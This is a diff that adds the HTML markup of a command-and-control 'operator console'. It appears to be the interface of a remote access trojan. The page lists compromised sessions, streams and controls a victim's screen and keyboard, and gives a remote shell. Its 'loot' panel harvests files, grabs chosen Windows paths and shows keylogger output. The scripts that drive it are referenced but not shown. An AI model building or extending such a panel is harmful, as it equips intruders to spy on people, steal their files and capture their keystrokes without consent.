@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>c2 // operator console</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="logo.svg" type="image/svg+xml">
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">
+    <img class="brand-mark" src="logo.svg" alt="" width="22" height="22">
+    <span class="brand-name">c2<span class="brand-sep"> // </span>operator console</span>
+  </div>
+  <div class="topbar-right">
+    <span id="latency" class="latency" title="round-trip latency">rtt --</span>
+    <span id="connChip" class="chip chip-idle">no session</span>
+    <label class="token-wrap" title="auth token">
+      <span class="token-label">token</span>
+      <input id="tokenInput" class="token-input" type="password" autocomplete="off" spellcheck="false" placeholder="unset">
+    </label>
+  </div>
+</header>
+
+<main class="layout">
+  <aside class="rail" aria-label="sessions">
+    <div class="rail-head">
+      <span>sessions</span>
+      <span id="sessCount" class="sess-count">0</span>
+    </div>
+    <ul id="sessList" class="sess-list"></ul>
+    <div id="sessEmpty" class="sess-empty">no sessions<br><span>polling /api/sessions…</span></div>
+  </aside>
+
+  <section class="center">
+    <div class="toolbar">
+      <div class="tb-group">
+        <button id="btnDetach" class="btn" type="button" disabled>detach</button>
+        <button id="btnKbd" class="btn toggle" type="button" aria-pressed="false" title="capture keyboard into remote session">keyboard: off</button>
+        <button id="btnLoot" class="btn toggle" type="button" aria-pressed="false" title="harvested files and keylog">loot</button>
+      </div>
+      <div class="tb-group sliders">
+        <label class="ctl">fps <input id="rngFps" type="range" min="1" max="15" step="1" value="8"><output id="outFps" for="rngFps">8</output></label>
+        <label class="ctl">quality <input id="rngQ" type="range" min="20" max="80" step="1" value="45"><output id="outQ" for="rngQ">45</output></label>
+        <label class="ctl">scale <input id="rngScale" type="range" min="0.3" max="1" step="0.05" value="0.5"><output id="outScale" for="rngScale">0.50</output></label>
+      </div>
+      <div class="tb-group">
+        <span id="streamMeta" class="stream-meta">-- × --</span>
+      </div>
+    </div>
+    <div id="stage" class="stage" tabindex="0" aria-label="remote screen">
+      <canvas id="screen"></canvas>
+      <div id="stageOverlay" class="stage-overlay">no session</div>
+    </div>
+  </section>
+
+  <section class="shell" aria-label="command shell">
+    <div class="shell-head">
+      <span>shell</span>
+      <span id="shellTarget" class="shell-target">detached</span>
+      <button id="btnClear" class="btn btn-small" type="button">clear</button>
+    </div>
+    <div id="term" class="term" aria-live="polite"></div>
+    <form id="cmdForm" class="cmdline" autocomplete="off">
+      <span class="prompt" id="promptChar">&gt;</span>
+      <input id="cmdInput" class="cmd-input" type="text" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type command, enter to send" disabled>
+      <button class="btn btn-small" type="submit" id="btnSend" disabled>send</button>
+    </form>
+  </section>
+</main>
+
+<aside id="lootPanel" class="loot-panel" aria-label="loot" hidden>
+  <div class="loot-head">
+    <span>loot</span>
+    <span id="lootCount" class="loot-count">0</span>
+    <button id="btnLootClose" class="btn btn-small" type="button">close</button>
+  </div>
+  <div class="loot-actions">
+    <button id="btnHarvest" class="btn btn-small" type="button" disabled>harvest all</button>
+    <button id="btnKeylog" class="btn btn-small toggle" type="button" aria-pressed="false" disabled>keylog: off</button>
+    <button id="btnLootRefresh" class="btn btn-small" type="button">refresh</button>
+  </div>
+  <form id="lootPathForm" class="loot-path" autocomplete="off">
+    <input id="lootPath" class="loot-path-input" type="text" spellcheck="false" placeholder="C:\path\to\grab">
+    <button class="btn btn-small" type="submit" id="btnGrab" disabled>grab</button>
+  </form>
+  <div id="lootStatus" class="loot-status">not attached</div>
+  <ul id="lootList" class="loot-list"></ul>
+  <div class="keylog-head">keylog</div>
+  <pre id="keylog" class="keylog" aria-live="polite"></pre>
+</aside>
+
+<script src="vk.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
